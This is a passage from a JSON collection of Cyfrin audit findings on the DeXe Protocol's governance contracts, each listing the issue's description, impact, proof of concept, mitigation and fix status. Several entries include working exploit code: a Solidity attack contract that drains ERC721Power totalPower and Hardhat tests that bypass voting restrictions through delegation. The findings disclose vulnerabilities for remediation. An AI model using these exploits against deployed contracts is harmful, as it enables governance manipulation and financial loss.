`againstDilutionAmount`,\n2) setting `proposal.rewardAmount = amount - againstDilutionAmount`\n3) refunding `againstDilutionAmount` back to `govPool`\n4) change the [reward calculation divisor](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L122) to use only `coreRawVotesFor`\n\nNote: 2) gets slightly more complicated if the intention is to support fee-on-transfer tokens since the actual amount received by the contract would need to be calculated & used instead of the input amount.\n\n**Dexe:**\nFixed in [PR174](https://github.com/dexe-network/DeXe-Protocol/commit/a143871ed0ac7184aca9e385363eb7d72eaef190).\n\n**Cyfrin:** Verified.",
      "summary": "\nThis bug report is about the `DistributionProposal` contract in DeXe Protocol. It pays rewards only to users who voted \"for\" the proposal, not \"against\" it. However, when calculating the reward, the divisor is `coreRawVotesFor + coreRawVotesAgainst` which represents the total sum of all votes both \"for\" and \"against\". This has the effect of diluting the rewards to \"for\" voters, even though \"against\" voters don't qualify for the rewards. The missing rewards are permanently stuck inside the `DistributionProposal` contract unable to ever be paid out. \n\nThe impact of this bug is that in every proposal that has both \"for\" and \"against\" voters, the `DistributionProposal` rewards paid out to \"for\" voters will be less than the total reward amount held by the `DistributionProposal` contract and the missing balance will be permanently stuck inside the `DistributionProposal` contract.\n\nThe recommended mitigation for this bug is to either change the reward calculation divisor to use only `coreRawVotesFor`, or to implement a mechanism to refund the unpaid tokens from the `DistributionProposal` contract back to the `GovPool` contract.\n\nThe bug has been fixed in PR174 and verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27301",
      "title": "Attacker can at anytime dramatically lower `ERC721Power::totalPower` close to 0",
      "impact": "HIGH",
      "content": "**Description:** Attacker can at anytime dramatically lower `ERC721Power::totalPower` close to 0 using a permission-less attack contract by taking advantage of being able to call `ERC721Power::recalculateNftPower()` & `getNftPower()` for non-existent nfts:\n\n```solidity\nfunction getNftPower(uint256 tokenId) public view override returns (uint256) {\n    if (block.timestamp <= powerCalcStartTimestamp) {\n        return 0;\n    }\n\n    // @audit 0 for non-existent tokenId\n    uint256 collateral = nftInfos[tokenId].currentCollateral;\n\n    // Calculate the minimum possible power based on the collateral of the nft\n    // @audit returns default maxPower for non-existent tokenId\n    uint256 maxNftPower = getMaxPowerForNft(tokenId);\n    uint256 minNftPower = maxNftPower.ratio(collateral, getRequiredCollateralForNft(tokenId));\n    minNftPower = maxNftPower.min(minNftPower);\n\n    // Get last update and current power. Or set them to default if it is first iteration\n    // @audit both 0 for non-existent tokenId\n    uint64 lastUpdate = nftInfos[tokenId].lastUpdate;\n    uint256 currentPower = nftInfos[tokenId].currentPower;\n\n    if (lastUpdate == 0) {\n        lastUpdate = powerCalcStartTimestamp;\n        // @audit currentPower set to maxNftPower which\n        // is just the default maxPower even for non-existent tokenId!\n        currentPower = maxNftPower;\n    }\n\n    // Calculate reduction amount\n    uint256 powerReductionPercent = reductionPercent * (block.timestamp - lastUpdate);\n    uint256 powerReduction = currentPower.min(maxNftPower.percentage(powerReductionPercent));\n    uint256 newPotentialPower = currentPower - powerReduction;\n\n    // @audit returns newPotentialPower slightly reduced\n    // from maxPower for non-existent tokenId\n    if (minNftPower <= newPotentialPower) {\n        return newPotentialPower;\n    }\n\n    if (minNftPower <= currentPower) {\n        return minNftPower;\n    }\n\n    return currentPower;\n}\n\nfunction recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {\n    if (block.timestamp < powerCalcStartTimestamp) {\n        return 0;\n    }\n\n    // @audit newPower > 0 for non-existent tokenId\n    newPower = getNftPower(tokenId);\n\n    NftInfo storage nftInfo = nftInfos[tokenId];\n\n    // @audit as this is the first update since\n    // tokenId doesn't exist, totalPower will be\n    // subtracted by nft's max power\n    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);\n    // @audit then totalPower is increased by newPower where:\n    // 0 < newPower < maxPower hence net decrease to totalPower\n    totalPower += newPower;\n\n    nftInfo.lastUpdate = uint64(block.timestamp);\n    nftInfo.currentPower = newPower;\n}\n```\n\n**Impact:** `ERC721Power::totalPower` lowered to near 0. This can be used to artificially increase voting power since [`totalPower` is read when creating the snapshot](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L330-L331) and is used as [the divisor in `GovUserKeeper::getNftsPowerInTokensBySnapshot()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L559).\n\nThis attack is pretty devastating as `ERC721Power::totalPower` can never be increased since the `currentPower` of individual nfts can only ever be decreased; there is no way to \"undo\" this attack unless the nft contract is replaced with a new contract.\n\n**Proof of Concept:** Add attack contract `mock/utils/ERC721PowerAttack.sol`:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"../../gov/ERC721/ERC721Power.sol\";\n\nimport \"hardhat/console.sol\";\n\ncontract ERC721PowerAttack {\n    // this attack can decrease ERC721Power::totalPower close to 0\n    //\n    // this attack works when block.timestamp > nftPower.powerCalcStartTimestamp\n    // by taking advantage calling recalculateNftPower for non-existent nfts\n    function attack2(\n        address nftPowerAddr,\n        uint256 initialTotalPower,\n        uint256 lastTokenId,\n        uint256 attackIterations\n    ) external {\n        ERC721Power nftPower = ERC721Power(nftPowerAddr);\n\n        // verify attack starts on the correct block\n        require(\n            block.timestamp > nftPower.powerCalcStartTimestamp(),\n            \"ERC721PowerAttack: attack2 requires block.timestamp > nftPower.powerCalcStartTimestamp\"\n        );\n\n        // verify totalPower() correct at starting block\n        require(\n            nftPower.totalPower() == initialTotalPower,\n            \"ERC721PowerAttack: incorrect initial totalPower\"\n        );\n\n        // output totalPower before attack\n        console.log(nftPower.totalPower());\n\n        // keep calling recalculateNftPower() for non-existent nfts\n        // this lowers ERC721Power::totalPower() every time\n        // can't get it to 0 due to underflow but can get close enough\n        for (uint256 i; i < attackIterations; ) {\n            nftPower.recalculateNftPower(++lastTokenId);\n            unchecked {\n                ++i;\n            }\n        }\n\n        // output totalPower after attack\n        console.log(nftPower.totalPower());\n\n        // original totalPower : 10000000000000000000000000000\n        // current  totalPower : 900000000000000000000000000\n        require(\n            nftPower.totalPower() == 900000000000000000000000000,\n            \"ERC721PowerAttack: after attack finished totalPower should equal 900000000000000000000000000\"\n        );\n    }\n}\n```\n\nAdd test harness to `ERC721Power.test.js`:\n```javascript\n    describe(\"audit attacker can manipulate ERC721Power totalPower\", () => {\n      it(\"audit attack 2 dramatically lowers ERC721Power totalPower\", async () => {\n        // deploy the ERC721Power nft contract with:\n        // max power of each nft = 100\n        // power reduction 10%\n        // required collateral = 100\n        let maxPowerPerNft = toPercent(\"100\");\n        let requiredCollateral = wei(\"100\");\n        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;\n\n        // create power nft contract\n        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent(\"10\"), requiredCollateral);\n\n        // ERC721Power::totalPower should be zero as no nfts yet created\n        assert.equal((await nft.totalPower()).toFixed(), toPercent(\"0\").times(1).toFixed());\n\n        // create the attack contract\n        const ERC721PowerAttack = artifacts.require(\"ERC721PowerAttack\");\n        let attackContract = await ERC721PowerAttack.new();\n\n        // create 10 power nfts for SECOND\n        await nft.safeMint(SECOND, 1);\n        await nft.safeMint(SECOND, 2);\n        await nft.safeMint(SECOND, 3);\n        await nft.safeMint(SECOND, 4);\n        await nft.safeMint(SECOND, 5);\n        await nft.safeMint(SECOND, 6);\n        await nft.safeMint(SECOND, 7);\n        await nft.safeMint(SECOND, 8);\n        await nft.safeMint(SECOND, 9);\n        await nft.safeMint(SECOND, 10);\n\n        // verify ERC721Power::totalPower has been increased by max power for all nfts\n        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());\n\n        // fast forward time to just after the start of power calculation\n        await setTime(powerCalcStartTime);\n\n        // launch the attack\n        await attackContract.attack2(nft.address, maxPowerPerNft.times(10).toFixed(), 10, 91);\n      });\n    });\n```\n\nRun attack with: `npx hardhat test --grep \"audit attack 2 dramatically lowers ERC721Power totalPower\"`\n\n**Recommended Mitigation:** `ERC721Power::recalculateNftPower()` should revert when called for non-existent nfts.\n\n**Dexe:**\nFixed in [PR174](https://github.com/dexe-network/DeXe-Protocol/commit/8c52fe4264d7868ab261ee789d0efe9f4edddfc2).\n\n**Cyfrin:** Verified.",
      "summary": "\nThis bug report is about an attack on the ERC721Power contract, which is used to calculate voting power in the DeXe Protocol. The attacker can use a permission-less attack contract to call the `recalculateNftPower()` and `getNftPower()` functions for non-existent nfts. This will lower the `ERC721Power::totalPower` close to 0, which can be used to artificially increase voting power. The attack is devastating as `ERC721Power::totalPower` can never be increased and the only way to undo it is to replace the nft contract with a new one.\n\nThe proof of concept for this attack involves deploying an attack contract, creating 10 power nfts, and launching the attack. The recommended mitigation for this attack is to have `recalculateNftPower()` revert when called for non-existent nfts. This bug has been fixed in PR174 and verified.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [
        "Vote",
        "Delegate"
      ],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27300",
      "title": "Delegators incorrectly receive less rewards for longer proposals with multiple delegations",
      "impact": "HIGH",
      "content": "**Description:** Delegators incorrectly receive less rewards for longer proposals with multiple delegations as [retrieving the expected rewards](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolMicropool.sol#L145-L157) from the list of delegations will fail to retrieve the entire delegated amount when multiple delegations occur from the same delegator to the same delegatee over separate blocks.\n\n**Impact:** Delegators will receive less rewards than they should.\n\n**Proof of Concept:** Consider this scenario:\n\n2 Proposals that have a longer active timeframe with an `endDate` 2 months from now.\n\nProposal 1, Delegator delegates full voting power to Delegatee who votes, deciding proposal 1. Proposal 1 gets executed, both delegatee & delegator get paid their correct rewards.\n\nProposal 2, Delegator delegates half their voting power to Delegatee who votes but these votes aren't enough to decide the proposal. One month passes & the proposal is still active as it goes for 2 months.\n\nDelegator delegates the second half of their voting power to Delegatee. This triggers the automatic `revoteDelegated` such that Delegatee votes with the full voting power of Delegator which is enough to decide proposal 2.\n\nProposal 2 is then executed. Delegatee gets paid the full rewards for using Delegator's full voting power, but Delegator only receives *HALF* of the rewards they should get, even though they delegated their full voting power which was used to decide the proposal.\n\nHere is where it gets even more interesting; if instead of doing the second half-power delegation, Delegator undelegates the remaining amount then delegates the full amount and then Delegatee votes, Delegator gets paid the full rewards. But if delegator delegates in multiple (2 txns) with a month of time elapsing between them, they only get paid half the rewards.\n\nFirst add this helper function in `GovPool.test.js` under section `describe(\"Fullfat GovPool\", () => {`:\n```javascript\n    async function changeInternalSettings2(validatorsVote, duration) {\n      let GOV_POOL_SETTINGS = JSON.parse(JSON.stringify(POOL_PARAMETERS.settingsParams.proposalSettings[1]));\n      GOV_POOL_SETTINGS.validatorsVote = validatorsVote;\n      GOV_POOL_SETTINGS.duration = duration;\n\n      await executeValidatorProposal(\n        [\n          [settings.address, 0, getBytesAddSettings([GOV_POOL_SETTINGS])],\n          [settings.address, 0, getBytesChangeExecutors([govPool.address, settings.address], [4, 4])],\n        ],\n        []\n      );\n    }\n```\n\nThen put PoC in `GovPool.test.js` under section `describe(\"getProposalState()\", () => {`:\n```javascript\n      it(\"audit micropool rewards short-change delegator for long proposals with multiple delegations\", async () => {\n        // so proposals will be active in voting state for longer\n        const WEEK = (30 * 24 * 60 * 60) / 4;\n        const TWO_WEEKS = WEEK * 2;\n        const MONTH = TWO_WEEKS * 2;\n        const TWO_MONTHS = MONTH * 2;\n\n        // so proposal doesn't need to go to validators\n        await changeInternalSettings2(false, TWO_MONTHS);\n\n        // required for executing the first 2 proposals\n        await govPool.deposit(govPool.address, wei(\"200\"), []);\n\n        // create 4 proposals; only the first 2 will be executed\n        // create proposal 1\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(4, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(4, wei(\"100\"), [], false)]]\n        );\n        // create proposal 2\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], false)]]\n        );\n        // create proposal 3\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], false)]]\n        );\n        // create proposal 4\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], false)]]\n        );\n\n        let proposal1Id = 2;\n        let proposal2Id = 3;\n        let DELEGATEE = await accounts(10);\n        let DELEGATOR1 = await accounts(9);\n\n        let delegator1Tokens = wei(\"200000000000000000000\");\n        let delegator1Half = wei(\"100000000000000000000\");\n\n        let delegateeReward = wei(\"40000000000000000000\");\n        let delegator1Reward = wei(\"160000000000000000000\");\n\n        // mint tokens & deposit them to have voting power\n        await token.mint(DELEGATOR1, delegator1Tokens);\n        await token.approve(userKeeper.address, delegator1Tokens, { from: DELEGATOR1 });\n        await govPool.deposit(DELEGATOR1, delegator1Tokens, [], { from: DELEGATOR1 });\n\n        // delegator1 delegates its total voting power to AUDITOR\n        await govPool.delegate(DELEGATEE, delegator1Tokens, [], { from: DELEGATOR1 });\n\n        // DELEGATEE votes on the first proposal\n        await govPool.vote(proposal1Id, true, \"0\", [], { from: DELEGATEE });\n\n        // advance time\n        await setTime((await getCurrentBlockTime()) + 1);\n\n        // proposal now in SucceededFor state\n        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);\n\n        // execute proposal 1\n        await govPool.execute(proposal1Id);\n\n        // verify pending rewards via GovPool::getPendingRewards()\n        let pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal1Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal1Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        // verify pending delegator rewards via GovPool::getDelegatorRewards()\n        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR1, DELEGATEE);\n        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);\n        assert.deepEqual(pendingRewards.isVoteFor, [true]);\n        assert.deepEqual(pendingRewards.isClaimed, [false]);\n        // delegator1 receives full reward for all tokens they delegated\n        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);\n\n        // reward balances 0 before claiming rewards\n        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), \"0\");\n        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), \"0\");\n\n        // claim rewards\n        await govPool.claimRewards([proposal1Id], { from: DELEGATEE });\n        await govPool.claimMicropoolRewards([proposal1Id], DELEGATEE, { from: DELEGATOR1 });\n\n        // verify reward balances after claiming rewards\n        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), delegateeReward);\n        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), delegator1Reward);\n\n        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.Voting);\n\n        // delegator1 undelegates half of its total voting power from DELEGATEE,\n        // such that DELEGATEE only has half the voting power for second proposal\n        await govPool.undelegate(DELEGATEE, delegator1Half, [], { from: DELEGATOR1 });\n\n        // DELEGATEE votes on the second proposal for the first time using the first\n        // half of DELEGATOR1's voting power. This isn't enough to decide the proposal\n        await govPool.vote(proposal2Id, true, \"0\", [], { from: DELEGATEE });\n\n        // time advances 1 month, proposal is a longer proposal so still in voting state\n        await setTime((await getCurrentBlockTime()) + MONTH);\n\n        // delegator1 delegates remaining half of its voting power to DELEGATEE\n        // this cancels the previous vote and re-votes with the full voting power\n        // which will be enough to decide the proposal\n        await govPool.delegate(DELEGATEE, delegator1Half, [], { from: DELEGATOR1 });\n\n        // advance time\n        await setTime((await getCurrentBlockTime()) + 1);\n\n        // proposal now in SucceededFor state\n        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);\n\n        // execute proposal 2\n        await govPool.execute(proposal2Id);\n\n        // verify pending rewards via GovPool::getPendingRewards()\n        pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal2Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        // delegatee getting paid the full rewards for the total voting power\n        // delegator1 delegated\n        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal2Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        // verify pending delegator rewards via GovPool::getDelegatorRewards()\n        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR1, DELEGATEE);\n        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);\n        assert.deepEqual(pendingRewards.isVoteFor, [true]);\n        assert.deepEqual(pendingRewards.isClaimed, [false]);\n\n        // fails as delegator1 only paid half the rewards - not being paid for the\n        // full amount it delegated!\n        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);\n      });\n```\n\nRun with: `npx hardhat test --grep \"rewards short-change delegator for long proposals\"`\n\n**Recommended Mitigation:** Change how `GovMicroPool` [retrieves the expected rewards](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolMicropool.sol#L145-L157) from the list of delegated amounts such that the entire delegated amount will be retrieved when the same delegator delegates to the same delegatee multiple times over separate blocks.\n\n**Dexe:**\nFixed in [PR170](https://github.com/dexe-network/DeXe-Protocol/commit/02e0dde26343c98c7bb7211d7d42989daa6b742e).\n\n**Cyfrin:** Verified.",
      "summary": "\nA bug was reported for DeXe Protocol where delegators incorrectly receive less rewards for longer proposals with multiple delegations. This occurs because the expected rewards from the list of delegations fails to retrieve the entire delegated amount when multiple delegations occur from the same delegator to the same delegatee over separate blocks. This means that delegators will receive less rewards than they should.\n\nA proof of concept was provided to demonstrate the bug. It involves creating two proposals with a longer active timeframe and having a delegator delegate full voting power to a delegatee who votes, deciding the first proposal. The first proposal is then executed and both the delegatee and delegator receive their correct rewards. For the second proposal, the delegator delegates half their voting power to the delegatee who votes, but these votes are not enough to decide the proposal. One month passes and the proposal is still active as it goes for two months. The delegator then delegates the second half of their voting power to the delegatee, which triggers an automatic revote with the full voting power of the delegator. This is enough to decide the proposal, and the delegatee gets paid the full rewards for using the delegator's full voting power, but the delegator only receives half of the rewards they should get.\n\nThe recommended mitigation for this bug is to change how GovMicroPool retrieves the expected rewards from the list of delegated amounts such that the entire delegated amount will be retrieved when the same delegator delegates to the same delegatee multiple times over separate blocks. The bug was fixed in PR170 and was verified.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27299",
      "title": "Attacker can use delegation to bypass voting restriction to vote on proposals they are restricted from voting on",
      "impact": "HIGH",
      "content": "**Description:** Attacker can use delegation to bypass voting restriction to vote on proposals they are restricted from voting on.\n\n**Impact:** Attacker can vote on proposals they are restricted from voting on.\n\n**Proof of Concept:** Add PoC to `GovPool.test.js` under section `describe(\"vote()\", () => {`:\n```javascript\n      it(\"audit bypass user restriction on voting via delegation\", async () => {\n        let votingPower = wei(\"100000000000000000000\");\n        let proposalId  = 1;\n\n        // create a proposal where SECOND is restricted from voting\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesUndelegateTreasury(SECOND, 1, [])]],\n          []\n        );\n\n        // if SECOND tries to vote directly this fails\n        await truffleAssert.reverts(\n          govPool.vote(proposalId, true, votingPower, [], { from: SECOND }),\n          \"Gov: user restricted from voting in this proposal\"\n        );\n\n        // SECOND has another address SLAVE which they control\n        let SLAVE = await accounts(10);\n\n        // SECOND delegates their voting power to SLAVE\n        await govPool.delegate(SLAVE, votingPower, [], { from: SECOND });\n\n        // SLAVE votes on the proposal; votes \"0\" as SLAVE has no\n        // personal voting power, only the delegated power from SECOND\n        await govPool.vote(proposalId, true, \"0\", [], { from: SLAVE });\n\n        // verify SLAVE's voting\n        assert.equal(\n          (await govPool.getUserVotes(proposalId, SLAVE, VoteType.PersonalVote)).totalRawVoted,\n          \"0\" // personal votes remain the same\n        );\n        assert.equal(\n          (await govPool.getUserVotes(proposalId, SLAVE, VoteType.MicropoolVote)).totalRawVoted,\n          votingPower // delegated votes from SECOND now included\n        );\n        assert.equal(\n          (await govPool.getTotalVotes(proposalId, SLAVE, VoteType.PersonalVote))[0].toFixed(),\n          votingPower // delegated votes from SECOND now included\n        );\n\n        // SECOND was able to abuse delegation to vote on a proposal they were\n        // restricted from voting on.\n      });\n```\n\nRun with: `npx hardhat test --grep \"audit bypass user restriction on voting via delegation\"`\n\n**Recommended Mitigation:** Rework the voting restriction mechanism such that attackers can't abuse the delegation system to vote on proposals they are prohibited from voting on.\n\n**Dexe:**\nFixed in [PR168](https://github.com/dexe-network/DeXe-Protocol/commit/01bc28e89a99da5f7b67d6645c935f7230a8dc7b).\n\n**Cyfrin:** Verified.",
      "summary": "\nThis bug report is about an attack where an attacker can use delegation to bypass voting restrictions and vote on proposals they are not allowed to vote on. A proof of concept was provided to demonstrate this attack and it was tested successfully. The recommended mitigation for this attack is to rework the voting restriction mechanism to prevent attackers from abusing the delegation system. The bug has been fixed in PR168 and verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27298",
      "title": "A malicious DAO Pool can create a token sale tier without actually transferring any DAO tokens",
      "impact": "HIGH",
      "content": "**Description:** `TokenSaleProposalCreate::createTier` is called by a DAO Pool owner to create a new token sale tier. A fundamental prerequisite for creating a tier is that the DAO Pool owner must transfer the `totalTokenProvided` amount of DAO tokens to the `TokenSaleProposal`.\n\nCurrent implementation implements a low-level call to transfer tokens from `msg.sender(GovPool)` to `TokenSaleProposal` contract. However, the implementation fails to validate the token balances after the transfer is successful. We notice a `dev` comment stating \"return value is not checked intentionally\" - even so, this vulnerability is not related to checking return `status` but to verifying the contract balances before & after the call.\n\n```solidity\nfunction createTier(\n        mapping(uint256 => ITokenSaleProposal.Tier) storage tiers,\n        uint256 newTierId,\n        ITokenSaleProposal.TierInitParams memory _tierInitParams\n    ) external {\n\n       ....\n         /// @dev return value is not checked intentionally\n  >      tierInitParams.saleTokenAddress.call(\n            abi.encodeWithSelector(\n                IERC20.transferFrom.selector,\n                msg.sender,\n                address(this),\n                totalTokenProvided\n            )\n        );  //@audit -> no check if the contract balance has increased proportional to the totalTokenProvided\n   }\n```\n\nSince a DAO Pool owner can use any ERC20 as a DAO token, it is possible for a malicious Gov Pool owner to implement a custom ERC20 implementation of a token that overrides the `transferFrom` function. This function can override the standard ERC20 `transferFrom` logic that fakes a successful transfer without actually transferring underlying tokens.\n\n**Impact:** A fake tier can be created without the proportionate amount of DAO Pool token balance in the `TokenSaleProposal` contract. Naive users can participate in such a token sale assuming their DAO token claims will be honoured at a future date. Since the pool has insufficient token balance, any attempts to claim the DAO pool tokens can lead to a permanent DOS.\n\n**Recommended Mitigation:** Calculate the contract balance before and after the low-level call and verify if the account balance increases by `totalTokenProvided`. Please be mindful that this check is only valid for non-fee-on-transfer tokens. For fee-on-transfer tokens, the balance increase needs to be further adjusted for the transfer fees. Example code for non-free-on-transfer-tokens:\n```solidity\n        // transfer sale tokens to TokenSaleProposal and validate the transfer\n        IERC20 saleToken = IERC20(_tierInitParams.saleTokenAddress);\n\n        // record balance before transfer in 18 decimals\n        uint256 balanceBefore18 = saleToken.balanceOf(address(this)).to18(_tierInitParams.saleTokenAddress);\n\n        // perform the transfer\n        saleToken.safeTransferFrom(\n            msg.sender,\n            address(this),\n            _tierInitParams.totalTokenProvided.from18Safe(_tierInitParams.saleTokenAddress)\n        );\n\n        // record balance after the transfer in 18 decimals\n        uint256 balanceAfter18 = saleToken.balanceOf(address(this)).to18(_tierInitParams.saleTokenAddress);\n\n        // verify that the transfer has actually occured to protect users from malicious\n        // sale tokens that don't actually send the tokens for the token sale\n        require(balanceAfter18 - balanceBefore18 == _tierInitParams.totalTokenProvided,\n                \"TSP: token sale proposal creation received incorrect amount of tokens\"\n        );\n```\n\n**Dexe:**\nFixed in [PR177](https://github.com/dexe-network/DeXe-Protocol/commit/64bbcf5b1575e88ead4e5fd58d8ee210a815aad6).\n\n**Cyfrin:** The fix changed from using `transferFrom` to `safeTransferFrom` however the recommendation requires that the actual balance be checked before and after the transfer to verify the correct amount of tokens have actually been transferred.",
      "summary": "\nA bug was found in the `TokenSaleProposalCreate::createTier` function of the DAO Pool, which is called by a DAO Pool owner to create a new token sale tier. The bug is related to the lack of validation of the token balances after the transfer of the `totalTokenProvided` amount of DAO tokens to the `TokenSaleProposal` contract. A malicious Gov Pool owner could exploit this vulnerability by implementing a custom ERC20 implementation of a token that overrides the `transferFrom` function and fakes a successful transfer without actually transferring underlying tokens. This would enable them to create a fake tier without the proportionate amount of DAO Pool token balance in the `TokenSaleProposal` contract, leading naive users to participate in such a token sale. This could result in a permanent DOS if users attempt to claim the DAO pool tokens.\n\nThe recommended mitigation for this bug is to calculate the contract balance before and after the low-level call and verify if the account balance increases by `totalTokenProvided` for non-fee-on-transfer tokens. For fee-on-transfer tokens, the balance increase needs to be further adjusted for the transfer fees. The fix was implemented in [PR177](https://github.com/dexe-network/DeXe-Protocol/commit/64bbcf5b1575e88ead4e5fd58d8ee210a815aad6) and changed from using `transferFrom` to `safeTransferFrom`, however the recommendation still requires that the actual balance be checked before and after the transfer to verify the correct amount of tokens have actually been transferred.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27297",
      "title": "Attacker can bypass token sale `maxAllocationPerUser` restriction to buy out the entire tier",
      "impact": "HIGH",
      "content": "**Description:** An attacker can bypass the token sale `maxAllocationPerUser` restriction to buy out the entire tier by doing multiple small buys under this limit.\n\n**Impact:** Permanent grief for other users who are unable to buy any of the exploited tier's tokens. Depending on the total supply a buyer could take control of the majority of the tokens by scooping them all up in a token sale, preventing them being distributed as intended and having monopoly control of the market. The `maxAllocationPerUser` restriction is not working as intended and can easily be bypassed by anyone.\n\n**Proof of Concept:** First add Tier 8 to `test/gov/proposals/TokenSaleProposal.test.js` [L718](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L718):\n```javascript\n        {\n          metadata: {\n            name: \"tier 8\",\n            description: \"the eighth tier\",\n          },\n          totalTokenProvided: wei(1000),\n          saleStartTime: timeNow.toString(),\n          saleEndTime: (timeNow + 10000).toString(),\n          claimLockDuration: \"0\",\n          saleTokenAddress: saleToken.address,\n          purchaseTokenAddresses: [purchaseToken1.address],\n          exchangeRates: [PRECISION.times(4).toFixed()],\n          minAllocationPerUser: wei(10),\n          maxAllocationPerUser: wei(100),\n          vestingSettings: {\n            vestingPercentage: \"0\",\n            vestingDuration: \"0\",\n            cliffPeriod: \"0\",\n            unlockStep: \"0\",\n          },\n          participationDetails: [],\n        },\n```\n\nThen add the PoC to the same file under the section `describe(\"if added to whitelist\", () => {` around [L1995](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L1995):\n```javascript\n    